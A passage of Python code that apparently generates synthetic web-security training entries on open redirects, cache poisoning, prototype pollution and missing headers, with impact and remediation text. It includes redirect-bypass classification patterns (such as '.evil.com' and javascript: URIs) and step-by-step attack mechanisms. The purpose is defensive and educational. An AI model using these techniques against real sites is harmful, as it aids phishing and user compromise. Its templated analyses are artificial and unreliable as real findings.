        "referrer_leak": "Without Referrer-Policy, sensitive URL parameters (tokens, IDs) may leak to third-party sites via the Referer header.",
        "feature_abuse": "Without Permissions-Policy, the page can access browser features (camera, microphone, geolocation) that could be exploited.",
        "weak_hsts": "HSTS max-age of 300 seconds (5 minutes) provides minimal protection. Attackers can wait for the policy to expire.",
        "info_disclosure": "Server and X-Powered-By headers reveal specific software versions, aiding attackers in finding known vulnerabilities.",
    }
    output += f"{risks.get(scenario['issue'], 'Security risk from missing headers.')}\n\n"

    output += "### Recommended Headers\n"
    output += "```\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n"
    output += "X-Content-Type-Options: nosniff\n"
    output += "X-Frame-Options: DENY\n"
    output += "Content-Security-Policy: default-src 'self'; frame-ancestors 'none'\n"
    output += "Referrer-Policy: strict-origin-when-cross-origin\n"
    output += "Permissions-Policy: camera=(), microphone=(), geolocation=()\n"
    output += "Cache-Control: no-store\n"
    output += "X-Permitted-Cross-Domain-Policies: none\n```\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"Missing Security Headers: {scenario['issue'].replace('_', ' ').title()} - {app}",
        severity=severity, cwe="CWE-693",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_open_redirect(rng, complexity, idx, prefix):
    pattern, desc = rng.choice(REDIRECT_PATTERNS)
    bypass = rng.choice(REDIRECT_BYPASSES)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)

    input_text = f"**Application:** {app} at https://{domain}\n"
    input_text += f"**Redirect Pattern:** {desc}\n"
    input_text += f"**Endpoint:** `{pattern.format(url='{{URL}}')}`\n\n"
    input_text += "The application redirects users based on a URL parameter without proper validation.\n"
    input_text += f"Test URL:\n```\nhttps://{domain}{pattern.format(url=bypass)}\n```"

    severity = pick_severity(rng, complexity)

    output = f"## Open Redirect Analysis\n\n"
    output += f"**CWE:** CWE-601 (Open Redirect)\n"
    output += f"**OWASP:** A01:2021 - Broken Access Control\n"
    output += f"**Severity:** {severity.upper()}\n\n"

    output += "### Vulnerability Description\n"
    output += f"The {desc.lower()} at `{domain}` accepts arbitrary URLs in the redirect parameter. "
    output += f"The bypass payload `{bypass}` circumvents any basic validation that may be in place.\n\n"

    output += "### Impact\n"
    output += "- **Phishing:** Attackers use the trusted domain to redirect victims to credential-harvesting pages\n"
    output += "- **OAuth Token Theft:** Redirect-based flows can leak authorization codes to attacker domains\n"
    output += "- **Malware Distribution:** Users trust links from the legitimate domain and follow redirects\n"
    output += "- **Reputation Damage:** Organization's domain appears in phishing campaigns\n\n"

    output += "### Bypass Techniques Tested\n"
    for b in REDIRECT_BYPASSES[:5]:
        output += f"- `{b}` - {_classify_redirect_bypass(b)}\n"
    output += "\n"

    output += "### Remediation\n"
    output += "1. **Allowlist Validation:** Only allow redirects to known, trusted domains\n"
    output += "   ```python\n   ALLOWED_HOSTS = ['app.example.com', 'www.example.com']\n"
    output += "   parsed = urlparse(redirect_url)\n"
    output += "   if parsed.netloc not in ALLOWED_HOSTS:\n"
    output += "       redirect_url = '/'\n   ```\n"
    output += "2. **Relative Path Only:** Restrict redirects to relative paths (no protocol or domain)\n"
    output += "3. **Indirect Reference Map:** Use indices/tokens that map to allowed URLs server-side\n"
    output += "4. **User Warning:** Display an interstitial page warning users they are leaving the site\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"Open Redirect: {desc} - {app}",
        severity=severity, cwe="CWE-601",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_cache_poison(rng, complexity, idx, prefix):
    vector = rng.choice(CACHE_POISON_VECTORS)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)
    path = rng.choice(["/", "/home", "/login", "/about", "/products", "/dashboard"])

    input_text = f"**Application:** {app} at https://{domain}\n"
    input_text += f"**Cached Path:** {path}\n\n"
    input_text += f"Request with injected header:\n```\nGET {path} HTTP/1.1\n"
    input_text += f"Host: {domain}\n"
    input_text += f"{vector['header']}: {vector['value']}\n```\n\n"
    input_text += f"The response includes content reflecting the injected header value, "
    input_text += f"and the response is cached by a CDN/proxy with the cache key based only on Host + Path."

    severity = pick_severity(rng, complexity)

    output = f"## Web Cache Poisoning Analysis\n\n"
    output += f"**CWE:** CWE-444 (HTTP Request/Response Smuggling)\n"
    output += f"**Severity:** {severity.upper()}\n\n"

    output += "### Vulnerability Description\n"
    output += f"The {app} at `{domain}` processes the `{vector['header']}` header and reflects "
    output += f"its value in the response. The caching layer (CDN/reverse proxy) does not include "
    output += f"this header in the cache key, creating a cache poisoning opportunity.\n\n"

    output += "### Attack Mechanism\n"
    output += f"1. Attacker sends a request to `{path}` with `{vector['header']}: {vector['value']}`\n"
    output += f"2. Application processes the header and generates a response with poisoned content\n"
    output += f"3. Caching layer stores the poisoned response keyed on `{domain}{path}`\n"
    output += f"4. Subsequent legitimate users requesting `{path}` receive the poisoned cached response\n"
    output += f"5. Effect: {vector['effect']}\n\n"

    output += "### Impact\n"
    output += f"- {vector['effect']}\n"
    output += "- Mass user compromise as every visitor receives poisoned content\n"
    output += "- Persistent attack that survives until cache expires or is purged\n\n"

    output += "### Remediation\n"
    output += f"1. **Ignore Unkeyed Headers:** Do not use `{vector['header']}` to generate response content\n"
    output += "2. **Include in Cache Key:** Add security-relevant headers to the cache key (Vary header)\n"
    output += "3. **Strip Forwarded Headers:** Remove X-Forwarded-* headers at the edge before processing\n"
    output += "4. **Validate Headers:** Allowlist accepted values for forwarded headers\n"
    output += "5. **Cache Auditing:** Regularly test for cache key vs. response content discrepancies\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"Cache Poisoning via {vector['header']} - {app}",
        severity=severity, cwe="CWE-444",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


def _gen_proto_pollution(rng, complexity, idx, prefix):
    sink = rng.choice(PROTO_POLLUTION_SINKS)
    app = rng.choice(APP_CONTEXTS)
    domain = rand_domain(rng)
    framework = rng.choice(FRAMEWORKS["javascript"])

    input_text = f"**Application:** {app} ({framework}) at https://{domain}\n\n"
    input_text += f"The following code processes user-controlled input:\n"
    input_text += f"```javascript\n{sink['code']}\n```\n\n"
    input_text += f"User-controlled payload:\n```\n{sink['payload']}\n```"

    severity = pick_severity(rng, complexity)

    output = f"## Prototype Pollution Analysis\n\n"
    output += f"**CWE:** CWE-1321 (Improperly Controlled Modification of Object Prototype Attributes)\n"
    output += f"**OWASP:** A03:2021 - Injection\n"
    output += f"**Severity:** {severity.upper()}\n\n"

    output += "### Vulnerability Description\n"
    output += f"The {app} contains a prototype pollution vulnerability in its object merging/setting logic. "
    output += f"{sink['impact']}.\n\n"

    output += "### Affected Code\n"
    output += f"```javascript\n{sink['code']}\n```\n\n"

    output += "### Exploitation\n"
    output += f"**Payload:** `{sink['payload']}`\n\n"
    output += "After pollution, any newly created object inherits the injected properties:\n"
    output += "```javascript\nconst obj = {};\nconsole.log(obj.isAdmin); // true (polluted!)\nconsole.log(obj.polluted); // true\n```\n\n"

    output += "### Impact Chain\n"
    output += "1. **Property Injection:** Attacker sets arbitrary properties on Object.prototype\n"
    output += "2. **Authorization Bypass:** `if (user.isAdmin)` checks pass for all objects\n"
    output += "3. **Remote Code Execution:** In Node.js, polluted properties like `shell` or `env` "
    output += "can be consumed by child_process.spawn/exec\n"
    output += "4. **Denial of Service:** Polluting `toString` or `valueOf` crashes the application\n\n"

    output += "### Remediation\n"
    output += "1. **Freeze Prototypes:** `Object.freeze(Object.prototype)` in application bootstrap\n"
    output += "2. **Key Validation:** Reject keys containing `__proto__`, `constructor`, `prototype`\n"
    output += "   ```javascript\n   const BLOCKED = ['__proto__', 'constructor', 'prototype'];\n"
    output += "   if (BLOCKED.includes(key)) return;\n   ```\n"
    output += "3. **Use Map:** Replace plain objects with `Map` for user-controlled key-value data\n"
    output += "4. **Null Prototype Objects:** Use `Object.create(null)` for lookup tables\n"
    output += "5. **Safe Libraries:** Use libraries with prototype pollution protections (e.g., updated lodash)\n"

    return format_entry(
        entry_id=f"{prefix}-{idx:05d}",
        title=f"Prototype Pollution in {framework} - {app}",
        severity=severity, cwe="CWE-1321",
        instruction=rng.choice(WEB_INSTRUCTIONS),
        input_text=input_text, output_text=output,
    )


# ── Helper functions ──────────────────────────────────────────────────────

def _encoding_for_context(context_name):
    mapping = {
        "HTML body": "HTML entity",
        "HTML attribute": "HTML attribute",
        "JavaScript string": "JavaScript unicode escape",
        "URL parameter": "URL/percent",
        "Event handler": "JavaScript + HTML attribute",
        "CSS value": "CSS escape",
        "JSON response": "JSON with Content-Type: application/json",
        "Template literal": "JavaScript template literal escape",
        "SVG context": "XML/HTML entity",
        "iframe src": "URL validation + allowlist",
    }
    return mapping.get(context_name, "context-appropriate")


def _analyze_csp_directive(directive):
    d = directive.strip().lower()
    if "'unsafe-inline'" in d:
        return "WEAK - allows inline script/style execution, defeating XSS protection"
    if "'unsafe-eval'" in d:
        return "WEAK - allows eval() and similar dynamic code execution"
    if "* " in d or d.endswith("*") or " *" in d:
        return "WEAK - wildcard allows loading from any origin"
    if "'none'" in d:
        return "STRICT - blocks all sources for this directive"
    if "'self'" in d and "http" not in d:
        return "MODERATE - restricts to same origin only"
    if "nonce-" in d:
        return "GOOD - nonce-based execution requires server-generated token"
    if "https:" in d:
        return "WEAK - allows any HTTPS origin, not sufficiently restrictive"
    return "Review required based on specific sources listed"


def _classify_redirect_bypass(bypass):
    if bypass.startswith("//"):
        return "Protocol-relative URL bypass"
    if bypass.startswith("/\\"):
        return "Backslash normalization bypass"
    if "@" in bypass:
        return "URL authority bypass using @ symbol"
    if ".evil.com" in bypass:
        return "Subdomain spoofing bypass"
    if bypass.startswith("javascript:"):
        return "JavaScript protocol bypass"
    if bypass.startswith("data:"):
        return "Data URI bypass"
    if "%2F" in bypass:
        return "URL encoding bypass"
    return "Direct external URL"


# ── Main generator ────────────────────────────────────────────────────────

class WebAppSecurityGenerator(CategoryGenerator):
    category = "web_app_security"
    id_prefix = "xld-web"

    def generate_entries(self, rng: random.Random, count: int, start_id: int,
                         complexity_weights: Dict[str, float]) -> List[Dict[str, Any]]:
        entries = []
        # Distribution across scenario types (percentages of total)
        generators = [
            (_gen_xss, 0.20),
            (_gen_csrf, 0.13),
            (_gen_clickjacking, 0.10),
            (_gen_cors, 0.12),
            (_gen_cookie, 0.10),
            (_gen_csp, 0.10),
            (_gen_headers, 0.08),
            (_gen_open_redirect, 0.07),
            (_gen_cache_poison, 0.05),
            (_gen_proto_pollution, 0.05),
        ]

        idx = start_id
        for gen_func, pct in generators:
            n = int(count * pct)
            for _ in range(n):
                complexity = pick_complexity(rng, complexity_weights)
                entries.append(gen_func(rng, complexity, idx, self.id_prefix))
                idx += 1

        # Fill remaining entries with random generators
        while len(entries) < count:
            gen_func = rng.choice([g for g, _ in generators])
            complexity = pick_complexity(rng, complexity_weights)
            entries.append(gen_func(rng, complexity, idx, self.id_prefix))
            idx += 1

        return entries
